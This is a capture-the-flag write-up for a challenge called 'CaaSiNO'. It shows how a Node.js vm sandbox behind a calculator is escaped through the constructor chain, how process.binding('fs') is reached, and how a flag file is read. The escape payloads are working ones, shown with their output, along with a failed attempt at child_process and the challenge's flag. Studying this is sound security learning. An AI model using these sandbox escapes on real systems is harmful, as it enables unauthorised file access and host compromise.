# misc/CaaSiNO

## Flag
```
flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}
```

## Introduction
By looking at the javascript provided, we see that the code the "calculator" executes is running with `vm`, a lib used to execute JS code in Sandbox mode. (https://nodejs.org/api/vm.html)

So we're bsaically inside a JSJail!

## Solution
One of the first things we see when looking at the documentation is a disclaimer stating that the lib is not to be used as a security mechanism... So... There must be a way to escape from the context.

Searching a little bit for things like "nodejs vm escape" will provide a couple of existing links. The ones I used to help solve this callenge were:
 1- https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af
 2- https://blog.netspi.com/escape-nodejs-sandboxes/

From resource 1, the most relevant thing is the ability to make an eval of a string on the Global context (not the sandbox one), by using  (this.constructor.constructor(""))() https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af#file-escape-js-L48-L50

So we can start playing with that. For example, if we look at `this` and its `process` variable, we can see that in Sandbox mode, it's `undefined`
```
> this
[object Object]
> this.process
undefined
```

However, using the constructor escape...
```
> (this.constructor.constructor("return this.process"))()
[object process]
```
Bingo, we have a process!

After this, since the challenge already provides a hint stating the location of the flag file, the first thing I tried was using common JS/nodeJS libs to read files. But it seems that we cannot do `require` of libs.
```
> (this.constructor.constructor("var fs = require('fs'); return fs"))()
An error occurred.
> (this.constructor.constructor("var cp = require('child_process'); return cp"))()
An error occurred.
```

Reading now from resource 2, I noticed a peculiar way of "importing" some libs using `process.binding('fs')`. So, let's try it!
```
> (this.constructor.constructor("var fs = this.process.binding('fs'); return fs;"))()
[object Object]
```
Trying to load 'fs' returns something!

Apparently, NodeJS has the possibility of creating things on different languages (like C/C++) taking advantage of the language, and then binding it to it.
It seems that by default, there is a standard set of bindings that you can use in Node, which could be described using the `natives` binding:

```
> (this.constructor.constructor("var n = this.process.binding('natives'); return Object.getOwnPropertyNames(n);"))()
_http_agent,_http_client,_http_common,_http_incoming,_http_outgoing,_http_server,_stream_duplex,_stream_passthrough,_stream_readable,_stream_transform,_stream_wrap,_stream_writable,_tls_common,_tls_wrap,assert,async_hooks,buffer,child_process,cluster,console,constants,crypto,dgram,dns,domain,events,fs,fs/promises,http,http2,https,inspector ...
```

We can see that `fs` is effectively among the possible bindings. `child_process` is mentioned as well, so I tried using it directly to execute os commands directly, but it fails. It would seem that not all the listed bindings are available to use:
```
> (this.constructor.constructor("var c = this.process.binding('child_process'); return c;"))()
An error occurred.
```

So, I focus back on `fs`. Taking a look at the available properties, we can see a list of common methods
```
> (this.constructor.constructor("var fs = this.process.binding('fs'); return Object.getOwnPropertyNames(fs);"))()
access,close,open,openFileHandle,read,readBuffers,fdatasync,fsync,rename,ftruncate,rmdir,mkdir,readdir,internalModuleReadJSON,internalModuleStat,stat,lstat,fstat,link,symlink,readlink,unlink,writeBuffer,writeBuffers,writeString,realpath,copyFile,chmod,fchmod,chown,fchown,lchown,utimes,futimes,mkdtemp,kFsStatsFieldsNumber,statValues,bigintStatValues,StatWatcher,FSReqCallback,FileHandle,kUsePromises

> (this.constructor.constructor("var fs = this.process.binding('fs'); return fs.open;"))()
function open() { [native code] }
```

And from resource #2, we can see these bindings are using os commands for open, read, etc. (https://linux.die.net/man/2/read)

So, from here we basically need to open the ctf flag file and read it!
Below is the code-recipe:

```
var fs = this.process.binding('fs');
var readonly_flag = 0;
var mode = 0o666;
var fd  = fs.open('/ctf/flag.txt', readonly_flag, mode, undefined, {path: '/ctf/flag.txt'}); 
var buffer = Buffer.alloc(100); 
fs.read(fd, buffer, 0, 100, -1, undefined, {});
return buffer;
```

In order to put the code-recipe together, I had to look on the source files of NodeJS on how fs was being used to open and read, so to understand the flags, mode, buffer, etc
    - https://github.com/nodejs/node/blob/master/lib/fs.js
    - https://github.com/nodejs/node/blob/master/lib/buffer.js

And the final command alltogether would be:
(this.constructor.constructor("var fs = this.process.binding('fs');var readonly_flag = 0;var mode = 0o666;var fd  = fs.open('/ctf/flag.txt', readonly_flag, mode, undefined, {path: '/ctf/flag.txt'}); var buffer = Buffer.alloc(100); fs.read(fd, buffer, 0, 100, -1, undefined, {});return buffer;"))()

We run it and...
```
> (this.constructor.constructor("var fs = this.process.binding('fs');var readonly_flag = 0;var mode = 0o666;var fd  = fs.open('/ctf/flag.txt', readonly_flag, mode, undefined, {path: '/ctf/flag.txt'}); var buffer = Buffer.alloc(100); fs.read(fd, buffer, 0, 100, -1, undefined, {});return buffer;"))()

flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}
```
